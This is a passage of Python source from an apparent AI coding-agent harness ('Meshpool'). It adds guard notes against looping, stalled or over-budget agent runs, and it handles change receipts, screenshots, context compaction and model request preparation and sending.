        looks = [c for c in after if re.search(r"\bassert\b|\bcheck|\bverify|load_workbook|Document\(|Presentation\(|"
                                               r"\bunzip\b|\bgrep\b|\bcat\b|\bhead\b", str(c.get("cmd", "")), re.I)]
        if len(looks) < cap or len(looks) != len(after) or any(c.get("code") not in (0, None) for c in after):
            return ""
        g["verify_capped"] = True
        return (f"\n[Meshpool] The file is saved and your last {len(after)} checks passed. Stop checking: answer now, "
                "unless a check showed a real defect in the file.")

    def _cycle_note(self, c: dict, g: dict) -> str:
        """broad2 (swe_sympy): core looped patch -> test -> patch (4.8 edits and 9.3 checks a run, 5 runs at the step
        cap) where Codex read, edited once and checked once. After MH_CYCLE_NOTE project edits that were each followed
        by a failing check (0, the default, is off until measured), the result says once to stop patching and find the
        cause."""
        try:
            limit = int(os.environ.get("MH_CYCLE_NOTE", "0") or 0)
        except ValueError:
            limit = 0
        if limit <= 0 or g.get("cycle_done") or (c.get("function") or {}).get("name") not in ("shell", "bash"):
            return ""
        cmds = getattr(self.ws, "commands", None) or []
        last = cmds[-1] if cmds else None
        edits = getattr(self.ws, "edits", 0)
        if not last or not edits or last.get("code") in (0, None) or \
                not self.ws._CHECKISH.search(str(last.get("cmd", ""))):
            return ""
        failed = g.setdefault("cycle_fail", set())
        failed.add(last.get("after_edit", edits))
        if len(failed) < limit:
            return ""
        g["cycle_done"] = True
        return (f"\n[Meshpool] The check still fails after {len(failed)} rounds of edits. Stop patching: read the "
                "failing test and the code it runs, find the root cause, then make one fix that addresses it.")

    def _scratch_rewrite_note(self, c: dict, g: dict) -> str:
        """Eval (4530fc66): 3.3 run calls and 0.8 failed runs a task against Codex's 2.1 and 0.2, mostly the same
        check script written again and again (7 rewrites of /tmp/check.py in a row on one task) while the project
        code stayed as it was. From the 3rd write of one scratch path with no project change, the result says so."""
        if os.environ.get("MH_SCRATCH_NOTE", "1") == "0":
            return ""
        f = c.get("function", {})
        args = str(f.get("arguments", ""))
        if f.get("name") not in ("shell", "exec_command", "bash", "bash_many") or "<<" not in args and "tee" not in args:
            return ""
        edits = getattr(self.ws, "edits", 0)
        seen = g.setdefault("scratch_w", {})
        if g.get("scratch_edits") != edits:          # the project changed: rewriting the check now is fair
            seen.clear()
            g["scratch_edits"] = edits
        note = ""
        for m in self._SCRATCH_W.finditer(args):
            path = m.group(1) or m.group(2)
            seen[path] = seen.get(path, 0) + 1
            if seen[path] == 3:
                note = (f"\n[Meshpool] You have written {path} 3 times and the project code has not changed since. "
                        "The check is not the problem to solve: keep this script, fix the project code it tests, and "
                        "run the same script again after the edit.")
        return note

    def _refusal_escalation(self, g: dict) -> str:
        """A model that keeps re-sending a call the guards refuse burns a request per refusal (eval traces: 18 and 26
        refusals in a row, up to the timeout). After MH_REFUSED_NUDGE refusals in a row it is told plainly to change
        course; at twice that, again; at MH_REFUSED_WRAP the next reply has tools off and must answer."""
        try:
            nudge = int(os.environ.get("MH_REFUSED_NUDGE", "2") or 0)
            wrap = int(os.environ.get("MH_REFUSED_WRAP", "6") or 0)
        except ValueError:
            nudge, wrap = 2, 6
        k = g.get("rseq", 0)
        if wrap > 0 and k >= wrap and not g.get("rwrap_done"):
            g["rwrap_done"] = g["hard_wrap"] = True        # once per turn: the next call has no tools
            g["rseq"] = 0
            return ("Your last calls were refused because they repeat a call whose result you already have. Tools "
                    "are off now. Give your final answer: what you changed, what works, and what is left.")
        level = (2 * nudge if k >= 2 * nudge else nudge) if nudge > 0 else 0
        if nudge > 0 and k >= nudge and g.get("rnote_at", 0) < level:   # crossing, not equality: a step can refuse several
            g["rnote_at"] = level
            return ("Stop sending that call: it was refused " + str(k) + " times in a row and will be refused again. "
                    "You already have its result above. Your next call must be different: change a file with "
                    "apply_patch, run a different check, or give your final answer."
                    + (" If you send it again, tools turn off." if level >= 2 * nudge and wrap > 0 else ""))
        if k == 0:
            g.pop("rnote_at", None)
        return self._failure_escalation(g)

    def _budget_escalation(self, g: dict, turn: dict) -> str:
        """A turn that has run long AND stopped making progress (no file changed, no new command succeeded for
        several steps) is told to converge, then, much later, has tools turned off. Eval (283eced2): the default
        profile cost 1.25x Codex and took 1.59x its time, almost all from a few runs that went to the 600 s limit
        with 17k-42k output tokens; the median task cost the same as Codex. A turn that keeps progressing is never
        cut: long builds are fine. MH_TURN_SOFT_S / MH_TURN_HARD_S (seconds), MH_TURN_OUT_SOFT / MH_TURN_OUT_HARD
        (output tokens) and MH_TURN_STALL (steps without progress) tune it; 0 turns a limit off."""
        def num(k, d):
            try:
                return int(os.environ.get(k, d) or 0)
            except ValueError:
                return d
        stall = num("MH_TURN_STALL", 3)
        np_ = g.get("np", 0)
        if stall <= 0 or np_ < stall or g.get("hard_wrap"):
            return ""
        secs = time.time() - g.get("t0", time.time())
        out = int((turn or {}).get("out", 0) or 0) if isinstance(turn, dict) else 0
        over = lambda v, k, d: (lambda lim: lim > 0 and v >= lim)(num(k, d))
        if np_ >= 2 * stall and not g.get("bwrap_done") and (
                over(secs, "MH_TURN_HARD_S", 360) or over(out, "MH_TURN_OUT_HARD", 30000)):
            g["bwrap_done"] = g["hard_wrap"] = True
            return (f"This task has run {int(secs)} s and the last {np_} steps changed nothing. Tools are off now. "
                    "Give your final answer: what you changed, what works, what does not and why.")
        if not g.get("bnote_done") and (over(secs, "MH_TURN_SOFT_S", 180) or over(out, "MH_TURN_OUT_SOFT", 15000)):
            g["bnote_done"] = True
            return (f"This task has run {int(secs)} s and the last {np_} steps changed nothing. Converge now: pick the "
                    "one check that decides whether the task is done, fix what it shows with a small patch, run it "
                    "once more, and answer. Do not write new probe scripts.")
        return ""

    def _step_budget(self, g: dict) -> str:
        """Lean lane: a dynamic step budget (arXiv 2510.16786: start low, extend once; 24-68% less cost at about the same
        solve rate). The runaway budget above only sees steps that change nothing; a run of distinct probes that all
        succeed (final21: 34-43 steps on regex-redos and window-median, where Codex took 9-18) is invisible to it. At
        MH_STEP_NOTE tool steps (off until measured; 14 is the candidate) the model is told where it stands; at twice that, to finish; at MH_STEP_WRAP
        tool steps (off by default, 0; 40 is the candidate) tools go off. 0 turns either one off."""
        if not self._lean():
            return ""
        try:
            soft = int(os.environ.get("MH_STEP_NOTE", "0") or 0)
            wrap = int(os.environ.get("MH_STEP_WRAP", "0") or 0)
        except ValueError:
            soft, wrap = 0, 0
        n = g["lean_steps"] = g.get("lean_steps", 0) + 1
        if wrap and n >= wrap and not g.get("hard_wrap"):
            g["hard_wrap"] = True
            return (f"That is {n} steps. Tools are off now. Give your final answer: what you changed, what works, "
                    "and what you could not finish.")
        if soft and n >= 2 * soft and not g.get("step_note2"):
            g["step_note2"] = g["step_note1"] = True
            return (f"That is {n} steps, far more than tasks like this need. Finish now: make the one remaining fix if "
                    "there is one, run the deciding check once, and answer.")
        if soft and n >= soft and not g.get("step_note1"):
            g["step_note1"] = True
            return (f"That is {n} steps; most tasks like this are done in under 10. Stop probing: decide what is left, "
                    "fix it, run one check that asserts the requested behaviour, and finish.")
        return ""

    def _failure_escalation(self, g: dict) -> str:
        """Distinct calls that all fail, with no file changed in between, are a loop the repeat guards cannot see. After
        MH_FAILED_NUDGE failures in a row the model is told to stop and read the error; at twice that, again; at
        MH_FAILED_WRAP the next reply has tools off. A changed file or any call that succeeds resets the count."""
        try:
            nudge = int(os.environ.get("MH_FAILED_NUDGE", "4") or 0)
            wrap = int(os.environ.get("MH_FAILED_WRAP", "12") or 0)
        except ValueError:
            nudge, wrap = 4, 12
        k = g.get("fseq", 0)
        if k == 0:
            g.pop("fnote_at", None)
            return ""
        if wrap > 0 and k >= wrap and not g.get("fwrap_done") and not g.get("hard_wrap"):
            g["fwrap_done"] = g["hard_wrap"] = True        # once per turn: the next call has no tools
            g["fseq"] = 0
            return ("Your last " + str(k) + " calls all failed and no file changed. Tools are off now. Give your "
                    "final answer: what you changed, what works, what fails and the exact error.")
        level = (2 * nudge if k >= 2 * nudge else nudge) if nudge > 0 else 0
        if nudge > 0 and k >= nudge and g.get("fnote_at", 0) < level:
            g["fnote_at"] = level
            return ("Your last " + str(k) + " calls all failed and no file changed since. Stop varying the same "
                    "attempt: read the last error message word for word and fix its cause. If a one-line python -c "
                    "keeps failing, write the script to a file first. If an edit is rejected, read the file and patch "
                    "a smaller, exact hunk."
                    + (" If the failures go on, tools turn off." if level >= 2 * nudge and wrap > 0 else ""))
        return ""

    def _v3_notes(self, step: int, calls: list, g: dict) -> str:
        """Harness v3 guards for one step: repeated identical calls, no progress for 12 or 24 steps, and the
        step budget. They add a short note for the model; they never block anything."""
        notes = []
        for c in calls:
            f = c.get("function", {})
            g["hist"].append(f.get("name", "") + ":" + str(f.get("arguments", ""))[:500])
        if E2E:                                          # the same lookup over and over, spread among other calls
            seen = g.setdefault("dups", {})
            for c in calls:
                f = c.get("function", {})
                if f.get("name") in ("bash", "bash_many", "bash_start", "bash_output", "bash_stop", "todo_write",
                                     "update_plan", "edit", "write_file", "apply_patch", "shell", "exec_command",
                                     "probe", "trace"):
                    continue
                k = f.get("name", "") + ":" + str(f.get("arguments", ""))[:500]
                seen[k] = seen.get(k, 0) + 1
                if seen[k] == 3:
                    notes.append(f"You have made the same {f.get('name')} call three times; the result does not "
                                 "change. Use what you already have, or ask a different question (another query, "
                                 "page or source).")
        g["n_calls"] = g.get("n_calls", 0) + len(calls)
        h = g["hist"] = g["hist"][-12:]
        hit = len(h) >= 3 and h[-1] == h[-2] == h[-3]
        for k in (2, 3):
            if not hit and len(h) >= 3 * k and h[-k:] == h[-2 * k:-k] == h[-3 * k:-2 * k]:
                hit = True
        if hit and g["doom_at"] < g["n_calls"] - 6:     # can fire again later (the history itself is capped at 12)
            g["doom_at"] = g["n_calls"]
            notes.append("You are repeating the same tool calls and getting the same results. Stop and reconsider: "
                         "use a different tool, different arguments or a different approach.")
        # Progress is a changed file or a new command that does something; read-only inspection (cat, sed -n, od,
        # git show, ls) succeeds every time and is not progress.
        new = [c for c in self.ws.commands if c.get("code") == 0 and c["cmd"] not in g["seen"]
               and not T.read_only(c["cmd"])]
        g["seen"].update(c["cmd"] for c in self.ws.commands)
        if new or self.ws.edits != g["edits"]:
            g["last"], g["edits"] = step, self.ws.edits
        elif step - g["last"] in (12, 24) and self.profile == "code":
            notes.append(f"{step - g['last']} steps without progress (no file changed, no new command succeeded). "
                         "Your current approach is not converging. In one sentence, state a different hypothesis or "
                         "a simpler route, then try it.")
        elif step - g["last"] >= int(os.environ.get("MH_STUCK_STEPS", "36")) and self.profile == "code" \
                and not g.get("hard_wrap_done"):
            g["hard_wrap_done"] = g["hard_wrap"] = True   # once: the next call has no tools and must answer
            notes.append("You have made no progress for a long time. Stop here: say what works, what does not, and "
                         "what you would try next. Do not call another tool.")
        cap = getattr(self, "_turn_cap", 0)
        if cap >= 30 and step == cap - 15:
            notes.append("15 steps left in this turn. Make sure what the user asked for exists and works now; refine "
                         "it afterwards if steps remain.")
        return " ".join(notes)

    # ---------- images (computer use, browser screenshots) -----------------------------------------------------
    def _attach_images(self, shots: list):
        """Tool results cannot carry images on the chat API, so screenshots follow as a user message. Only the latest
        two images stay in the conversation; older ones become a short note to keep requests small."""
        if os.environ.get("MH_VISION", "1") == "0" or self._model_is_blind():
            return
        # A screenshot bigger than the endpoint takes (a full-size Retina or 4K PNG) would fail every request and
        # be dropped each step, leaving the model acting blind without knowing why: leave it out and say so.
        cap = int(os.environ.get("MH_BIG_REQUEST", "3000000")) * 2 // 3
        shots = [(n, {**im, **_shrunk(im)}) for n, im in shots]       # a huge screenshot is made smaller, not dropped
        big = [n for n, im in shots if len(str(im.get("data") or "")) > cap]
        shots = [(n, im) for n, im in shots if len(str(im.get("data") or "")) <= cap]
        if big:
            self.messages.append({"role": "user", "content": "[Meshpool] The image from " + ", ".join(sorted(set(big)))
                                  + " was too large for the model endpoint and was left out, so you did not see it. "
                                  "Ask the tool for a smaller image (a region, a lower resolution or a JPEG) or go on "
                                  "without it."})
        if not shots:
            return
        _drop_images(self.messages, keep=max(0, 2 - len(shots)))
        parts = [{"type": "text", "text": "Image returned by " + ", ".join(sorted({n for n, _ in shots})) + ":"}]
        for _, im in shots[-2:]:
            parts.append(_image_part(im))
        self.messages.append({"role": "user", "content": parts})

    def _model_is_blind(self) -> bool:
        """True when this chat's current model refused images earlier (a bare model id in _no_vision_models)."""
        try:
            from meshpool_harness import providers as PV
            return PV.split(self.current_model())[1] in getattr(self, "_no_vision_models", ())
        except Exception:  # noqa: BLE001
            return False

    # ---------- model ------------------------------------------------------------------------------------------
    def receipt(self) -> str:
        """What this turn changed and how it was checked, from what the tools recorded (no model tokens), so the user
        can review it at a glance. Says so plainly when nothing ran after the last change."""
        files = sorted(getattr(self.ws, "turn_files", set()))
        if not files:
            return ""
        import subprocess
        rel = []
        for f in files:
            try:
                rel.append(os.path.relpath(f, self.root))
            except ValueError:
                rel.append(f)
        stats = {k.replace("/", os.sep): v for k, v in Agent._turn_line_stats(self).items()}   # this turn's own lines
        missing = [r for r in rel if r not in stats]     # changed outside the edit tools (a script): git fills them in
        if missing:
            try:                                         # against HEAD (counts uncommitted work too)
                r = subprocess.run(["git", "diff", "--numstat", "HEAD", "--", *missing], cwd=self.root,
                                   capture_output=True, text=True, timeout=10)
                for line in r.stdout.splitlines():
                    a, d, name = line.split("\t", 2)
                    stats.setdefault(name.replace("/", os.sep), f"+{a} -{d}")
            except Exception:  # noqa: BLE001 - not a git repo, or git missing
                pass
        created = {os.path.relpath(c, self.root) for c in getattr(self.ws, "turn_new", set()) if os.path.isabs(c)}
        stats = {k: v for k, v in stats.items() if k not in created}   # a file this turn made reads "(new)"
        parts = [f"{r} ({stats[r]})" if r in stats else f"{r} (new)" if r in created else r for r in rel[:12]]
        more = f" and {len(rel) - 12} more" if len(rel) > 12 else ""
        after = [c for c in self.ws.commands if c.get("after_edit", -1) >= self.ws.edits and c.get("kind") != "read"]
        if after:
            last = after[-1]
            # the command, not the `cd <long project path> &&` the model put in front of it
            cmd = re.sub(r"^\s*cd\s+(\"[^\"]*\"|'[^']*'|\S+)\s*&&\s*", "", last["cmd"]).strip() or last["cmd"]
            cmd = cmd.splitlines()[0][:80]
            check = _check_line(last["cmd"], cmd, last["code"])
            check += f" ({len(after)} command{'s' if len(after) > 1 else ''} after the last change)"
        else:
            check = "nothing was run after the last change, so it is not verified"
        rv = getattr(self, "last_review", None)
        if rv and rv.get("turn") == getattr(self, "_turn_no", 0):
            from meshpool_harness.agent import grader as GR
            check += "  \n**Independent check:** " + GR.receipt_line(rv)
        return f"**Changed:** {', '.join(parts)}{more}  \n**Checked:** {check}"

    def _turn_line_stats(self) -> dict:
        """{path: "+a -d"} of the open turn from the chat's checkpoint: the lines this turn changed, not the user's
        uncommitted edits that `git diff HEAD` would add to them. {} without a checkpoint or an open turn."""
        cp = getattr(self, "checkpoint", None)
        if cp is None:
            return {}
        try:
            ts = cp.turns()
            if not ts or ts[-1].get("done"):
                return {}
            return {f["path"]: f"+{f['add']} -{f['del']}" for f in cp.diff(ts[-1]["n"])["files"]
                    if not f.get("binary")}
        except Exception:  # noqa: BLE001 - a damaged record: fall back to git
            return {}

    def _delta(self, t: str):
        """Stream reply text, without any recalled-memory block the model echoed (assistant.scrub)."""
        sc = getattr(self, "_scrubber", None)
        if sc is None:
            from meshpool_harness.assistant import StreamScrubber
            sc = self._scrubber = StreamScrubber()
        t = sc.feed(t)
        if t:
            self.emit({"type": "text_delta", "text": t})

    def _check_stop(self):
        if self._stop:
            raise Interrupted()

    def _maybe_compact(self):
        # Long runs re-sent their whole history on every call (the 50-60-call runs were most of the dev A/B's cost).
        # Older tool outputs are elided once the context passes the limit, down to 60% of it, so the next trim is
        # many steps away and the provider's prompt cache is rebuilt rarely. Recent outputs stay verbatim.
        limit = int(self.hsettings()["compact_chars"])
        try:                                       # never above 70% of the model's real window (core/context.py)
            from meshpool_harness.core import context as CTX
            win = self._ctx_window()
            fixed = CTX.estimate(self.tool_schemas()) + 600
            limit = min(limit, CTX.compact_chars(win, fixed, limit))
        except Exception:  # noqa: BLE001
            pass
        try:                                       # a big window never compacts at a few thousand tokens
            if win > 32_768:
                limit = max(limit, min(int(self.hsettings()["compact_chars"]), 80_000))
        except Exception:  # noqa: BLE001
            pass
        size = _context_size(self.messages)
        guard = self.__dict__.setdefault("_compact_guard", __import__("meshpool_harness.core.context", fromlist=["x"]).CompactGuard())
        edits = getattr(self.ws, "edits", 0)
        if size > limit and guard.allow(size, edits):
            _shrink_context(self.messages, int(limit * 0.6))
            self.emit({"type": "status", "text": "Older tool outputs were shortened to keep the context small."})
            if _context_size(self.messages) > limit:         # still too big: the older steps become a handoff note
                self.compact_now()
            guard.record(_context_size(self.messages), edits, size)

    def compact_now(self):
        """Replace the older steps with a handoff note (agent/compaction.py). Returns what it did, or None."""
        from meshpool_harness.agent import compaction
        try:
            from meshpool_harness.agent import extras as EX
            EX.run_hooks(self.root, "PreCompact", {"messages": len(self.messages)})
        except Exception:  # noqa: BLE001
            pass
        try:
            win = self._ctx_window()
        except Exception:  # noqa: BLE001
            win = None
        r = compaction.compact_history(self.messages, win=win)
        if r:
            self.emit({"type": "status", "text": f"Summarized {r['removed']} earlier messages so the task can keep "
                                                 "going" + ("." if r["model"] else " (from the log only).")})
            try:
                self.save(full=True)               # the saved prefix was replaced by the summary
            except Exception:  # noqa: BLE001
                pass
        return r

    def _ctx_window(self) -> int:
        """The model's context window in tokens (core/context.py): override, what the endpoint reports, or a default."""
        from meshpool_harness import providers as PV
        from meshpool_harness.core import context as CTX
        model = self.current_model()
        prov = PV.split(model)[0]
        base, key = PV.endpoint(prov) if prov != "chatgpt" else ("", "")
        win = CTX.window(model, base, key)
        try:                                       # a window an earlier chat learned from this endpoint's replies
            from meshpool_harness.core import modelcaps as MC
            c = MC.resolve(base, PV.split(model)[1])
            if c.source.get("window") == "learned" and 512 <= c.window < win:
                win = c.window
        except Exception:  # noqa: BLE001
            pass
        return win

    def _fit_body(self, body: dict) -> None:
        """Keep the request inside the model's window: compact tool schemas, capped instructions, elided old output,
        a reply limit that leaves room. A one-line notice the first time a small window is seen."""
        from meshpool_harness.core import context as CTX
        win = self._ctx_window()
        CTX.tell_once(self.current_model(), win, lambda t: self.emit({"type": "status", "text": t}), "agent")
        self.ws.max_tool_chars = CTX.tool_output_chars(win)
        key = "max_completion_tokens" if "max_completion_tokens" in body else "max_tokens"
        msgs, tools, out = CTX.fit(body["messages"], body.get("tools"), win, body.get(key),
                                   getattr(self, "_ctx_tighten", 1.0))
        body["messages"] = msgs
        if tools is not None:
            body["tools"] = tools
        if key in body:
            body[key] = out

    def _body(self) -> dict:
        from meshpool_harness.profiles import apply, for_model
        model = self.current_model()
        prof = for_model(model, os.environ.get("MH_PROFILE"))
        lim = int((prof.get("limits") or {}).get("max_output_tokens", 8192))
        c171 = self._c171()
        if (self.profile == "code" and os.environ.get("MH_STEP_MAX_TOKENS", "4096") != "0"
                and not getattr(self, "_need_more", False) and not c171):   # c171: Codex writes whole files, uncapped
            # a coding step is a patch or a command, not a book: a step that runs to the limit again and again (8,192
            # tokens three times in a row, $0.11 for one task) is cut short and told to split the edit. A step that
            # legitimately needed more (a long single write that ended normally) lifts the cap for the chat.
            lim = min(lim, int(os.environ.get("MH_STEP_MAX_TOKENS", "4096")))
        body = {"model": model, "max_tokens": lim, "tools": self.tool_schemas(),
                "tool_choice": "none" if getattr(self, "_no_tools", False) else "auto"}
        src = repair_tool_pairs(list(self.messages))[0]
        if c171 and src and src[0].get("role") == "system":
            # Codex 0.171 sends its environment context as a user message of its own before the conversation
            # (compat.normalize_roles keeps it apart); only the request carries it, the chat history does not
            src = src[:1] + [{"role": "user", "content": self._c171_env()}] + src[1:]
        msgs, body = apply(prof, src, body, "worker")   # outgoing copy only
        if os.environ.get("MH_ELIDE_OLD_CALLS", "0") == "1":      # measured: it cost solves, so off unless asked
            msgs = _elide_old_calls(msgs)
        keep = int(os.environ.get("MH_MAX_IMAGES", "4"))
        if sum(1 for m in msgs if isinstance(m.get("content"), list)
               for p in m["content"] if isinstance(p, dict) and p.get("type") == "image_url") > keep:
            # Only the latest images go with a request; the chat keeps all of them. A month-old chat full of
            # screenshots otherwise resends megabytes every turn and the gateway refuses it (413).
            from meshpool_harness.core import compat as _CP
            msgs = _CP.cap_images(msgs, keep)           # the cut moves in steps, so the cacheable prefix stays put
        from meshpool_harness.core import compat as _CP2
        msgs = _CP2.shrink_images(msgs)                 # an old chat holding a huge image (length check; no decoding)
        if os.environ.get("MH_TEMPERATURE"):
            body["temperature"] = float(os.environ["MH_TEMPERATURE"])
        if self._model_is_blind() and _has_images(msgs):     # the history keeps the images; this model never gets them
            msgs = _blind_copy(msgs)
        body["messages"] = ST.prepare_messages(msgs)       # reasoning_content only inside the tool loop in progress
        caps = self._caps(model, prof)
        asked = (self.effort or "").strip().lower()
        eff = caps.effort(getattr(self, "lane", "task"), asked or str(prof.get("reasoning_effort") or ""))
        if asked and asked not in ("off", "none", "default") and eff != asked and self._effort_noted != asked + model:
            self._effort_noted = asked + model            # said once per level and model, and never sent
            self.emit({"type": "status", "text": f"{model} does not take effort '{asked}'; using its default."})
        if eff and "reasoning_effort" not in body:
            body["reasoning_effort"] = eff            # never the provider's default (high): hidden tokens cost money
        try:
            self._fit_body(body)
        except Exception:  # noqa: BLE001 - fitting is an optimisation: never stop the turn over it
            pass
        if os.environ.get("MH_CACHE_KEY", "1") == "1":
            body["prompt_cache_key"] = self.route_id()
            body["user"] = self.route_id()
        try:
            from meshpool_harness import providers as PV
            bare = PV.split(body.get("model"))[1]
            for f in _REFUSED.get(bare, ()):           # what this model refused before: right the first time
                if f == "reasoning_content":
                    body["messages"] = [{k: v for k, v in m.items() if k != "reasoning_content"} for m in body["messages"]]
                elif f == "max_tokens" and "max_tokens" in body:
                    body["max_completion_tokens"] = body.pop("max_tokens")
                else:
                    body.pop(f, None)
        except Exception:  # noqa: BLE001
            pass
        return self._prepare(body, caps, prof)

    def _prepare(self, body: dict, caps=None, prof=None) -> dict:
        """compat.prepare with what this endpoint+model taught (refused fields, token cap, roles, tool ids, schemas)."""
        try:
            from meshpool_harness import providers as PV
            from meshpool_harness.core import compat as _CP
            model = self.current_model()
            caps = caps or self._caps(model, prof)
            return _CP.prepare(body, caps, PV.endpoint(PV.split(model)[0])[0] or "")
        except Exception:  # noqa: BLE001 - shaping is an adaptation: never stop the turn over it
            return body

    def _prompt_cut(self, resp: dict, body: dict, base: str, turn: dict) -> bool:
        """H-02: a local server (Ollama) may cut a too-long prompt without an error. When the reply's prompt_tokens are far
        below what was sent, learn the real window, tell the user how to raise it, and report True (resend, fitted)."""
        try:
            from meshpool_harness.core import context as CTX
            from meshpool_harness.core import modelcaps as MC
            u = resp.get("usage") or {}
            n_in = u.get("prompt_tokens", 0) or 0
            sent = CTX.estimate(body.get("messages")) + CTX.estimate(body.get("tools") or [])
            # One judge for a silent cut (context.observe_silent_cut): local model servers only, never below a window
            # the table or provider states, total (fresh + cached) prompt tokens, two matching observations. A gateway
            # or metering proxy that reports usage differently must not shrink a 1M-token model to a few thousand.
            before = self._ctx_window()
            if not CTX.observe_silent_cut(self.current_model(), sent, u, before, base):
                return False
            win = CTX.window_info(self.current_model(), base, probe_endpoint=False)[0]
            if win >= before:
                return False
            MC.learn(base, body.get("model", ""), window=win)
            for k, v in (("in", n_in), ("out", u.get("completion_tokens", 0) or 0), ("calls", 1)):
                turn[k] += v                           # the discarded reply was paid for
                self.usage[k] += v
            how = ("raise the server's context size (for Ollama: set OLLAMA_CONTEXT_LENGTH, or num_ctx in a Modelfile, "
                   "then restart Ollama)" if _is_local_base(base) else "raise the server's context size")
            self.emit({"type": "status", "text": f"The server read only about {n_in:,} tokens of this conversation (its "
                                                 f"real context window is about {win:,}). To use a larger window, {how}. "
                                                 "The conversation is shortened to fit and sent again."})
            return True
        except Exception:  # noqa: BLE001
            return False

    def _text_tools(self, msg: dict) -> dict:
        """On an endpoint that cannot take tools, read <tool_call> blocks in the reply as ordinary tool calls."""
        try:
            if msg.get("tool_calls") or not self._caps(self.current_model()).no_tools:
                return msg
            from meshpool_harness.core import compat as _CP
            rest, calls = _CP.parse_text_tool_calls(msg.get("content") or "")
            return {**msg, "content": rest, "tool_calls": calls} if calls else msg
        except Exception:  # noqa: BLE001
            return msg

    def _tls_text(self, base: str, msg: str) -> str:
        from meshpool_harness.core import refusals as RF
        return (f"The connection to {base or 'the endpoint'} failed: its TLS certificate is not trusted. "
                + (RF.diagnose(msg) or {}).get("note", "") + " (" + msg[:160] + ")")

    def _diagnose(self, kind: str, msg: str, body: dict):
        """refusals.diagnose for a 4xx the request itself caused (None for anything else or when nothing is named)."""
        if kind not in ("bad_request", "vision", "context"):
            return None
        try:
            from meshpool_harness.core import refusals as RF
            return RF.diagnose(msg, body)
        except Exception:  # noqa: BLE001
            return None

    def _apply_fix(self, fix: dict, fixed: set, base: str, body: dict) -> bool:
        """Remember what a refusal taught (per endpoint+model, on disk). False when this fix was already applied in this
        call: the same refusal came back, so the request cannot be fixed that way."""
        from meshpool_harness.core import context as CTX
        from meshpool_harness.core import modelcaps as MC
        key = (fix["action"], tuple(fix.get("fields") or ()) or fix.get("max_output") or "")
        if key in fixed:
            return False
        fixed.add(key)
        model = str(body.get("model") or "")
        MC.learn(base, model, **(fix.get("learn") or {}))
        win = fix.get("context_window")
        if win:
            try:
                CTX.learn(self.current_model(), int(win))
            except Exception:  # noqa: BLE001
                pass
        return True

    def _keeps_reasoning(self) -> bool:
        """Whether this model passes reasoning_content back inside a tool-call turn (caps.keep_reasoning) and has not
        refused the field on this endpoint."""
        try:
            from meshpool_harness import providers as PV
            if "reasoning_content" in _REFUSED.get(PV.split(self.current_model())[1], ()):
                return False
            return bool(self._caps(self.current_model()).keep_reasoning)
        except Exception:  # noqa: BLE001
            return False

    def _caps(self, model: str, prof: dict | None = None):
        """What this model on its endpoint can do (core/modelcaps.py): every provider-specific choice reads this."""
        from meshpool_harness import providers as PV
        from meshpool_harness.core import modelcaps as MC
        prov, bare = PV.split(model)
        base, key = PV.endpoint(prov)
        if prov != "chatgpt":
            from meshpool_harness.core import context as CTX
            CTX.note_models(base, key)               # /models says "no tools": known before the first request
        return MC.resolve(base, bare, prof)

    def _chat(self, turn: dict) -> tuple[dict, bool]:
        body = self._body()
        # The model's provider decides where the call goes (providers.py): the key endpoint in settings or the
        # ChatGPT sign-in.
        from meshpool_harness import providers as PV
        prov, body["model"] = PV.split(body["model"])
        base, key = PV.endpoint(prov)         # the key endpoint: providers.key()/key_base() (an OpenAI key only
                                               # with OPENAI_BASE_URL, never with the Meshpool base)
        wire = "chatgpt" if prov == "chatgpt" else (
            "responses" if self._caps(self.current_model()).wire == "responses" else "chat")
        if not key and wire != "chatgpt" and not PV.keyless_ok(base):
            raise RuntimeError(f"No API key. Add MESHPOOL_API_KEY to {C.config_path()} or open Settings in the app.")
        if wire != "chatgpt" and PV.key_problem(key):
            raise RuntimeError(PV.key_problem(key))
        stream = wire == "chat" and os.environ.get("MH_STREAM", "1") != "0"
        self.emit({"type": "model_start"})
        resp, streamed, cleaned, shrunk, last = None, False, False, False, None
        ctx_shrinks, rc_tried = 0, False
        self._ctx_tighten = 1.0
        attempt, recoveries, swapped, auth_tries = -1, 0, False, 0
        # Rate limits are waited out on their own clock, not counted as failed attempts: a long task that hits the
        # key's limit carries on when the limit resets instead of ending the turn after a few minutes.
        rl_waited, rl_budget, rl_told = 0.0, _rate_limit_budget(), -1e9
        self._first_scale = 1.0
        fixed: set = set()                                 # (action, field) refusals already fixed in this call
        cut_resent = False                                 # a silently cut prompt is resent once per call (H-02)
        task = self._ensure_task()
        while True:
            attempt += 1
            if attempt >= 8:                               # every attempt waited or withheld: report the last error
                raise last or RuntimeError("HTTP 0: the model call did not go through")
            self._check_stop()
            res = None
            try:
                # the spending limit: refuse before the call; the call that crosses it is still used
                res = usage.reserve(body["model"], request_chars=_context_size(body["messages"]),
                                    max_tokens=body.get("max_tokens") or 0, base=base, task=task)
                if wire == "chatgpt":                  # the user's ChatGPT sign-in (core/chatgpt.py)
                    from meshpool_harness.core import chatgpt as CG
                    from meshpool_harness.core.wire import from_responses

                    def on_text(t):
                        nonlocal streamed
                        streamed = True
                        self._delta(t)
                    resp = from_responses(self._wait(CG.chat, body, task_id=self.id, on_text=on_text,
                                                     idle=int(os.environ.get("MH_AGENT_IDLE_S", "120"))))
                elif wire == "responses":
                    from meshpool_harness.core.wire import SimpleLedger
                    extra = {k: v for k, v in body.items() if k not in ("model", "messages", "max_tokens", "temperature")}
                    if "reasoning_effort" in extra:      # the Responses API names it reasoning.effort
                        extra["reasoning"] = {"effort": extra.pop("reasoning_effort")}
                    resp = self._wait(SimpleLedger("agent").chat, model=body["model"], messages=body["messages"],
                                      max_tokens=body.get("max_tokens", 8192),
                                      temperature=body.get("temperature"), extra=extra, retries=0)
                else:
                    h = GW.health(base, key, body["model"])
                    if h.is_down() and not self._await_endpoint(h, base, key, body["model"]):
                        raise _EndpointDown("HTTP 0: the model endpoint did not come back")
                    slot = h.acquire(self._check_stop, self.emit)
                    tok: dict = {}                         # the worker gives the slot back when the request ends
                    resp, streamed = self._wait(self._post_slotted, h, slot, base, key, body, stream, tok,
                                                on_abandon=lambda: tok.__setitem__("abort", True))
                usage.record(body["model"], (resp or {}).get("usage"), base="" if wire == "chatgpt" else base,
                             source=self._src(), task=task, reservation=res,
                             request_chars=_context_size(body["messages"]), reply_chars=_reply_chars(resp))
                self._key_ok = key                         # this key has been accepted: a later 401 may be spurious
                bad = _bad_reply(resp)
                if bad:                                # a 200 that carries no reply: retry or report, never "(no reply)"
                    raise RuntimeError("HTTP 0: the model endpoint sent no usable reply (" + bad + ")")
                self._first_scale = 1.0
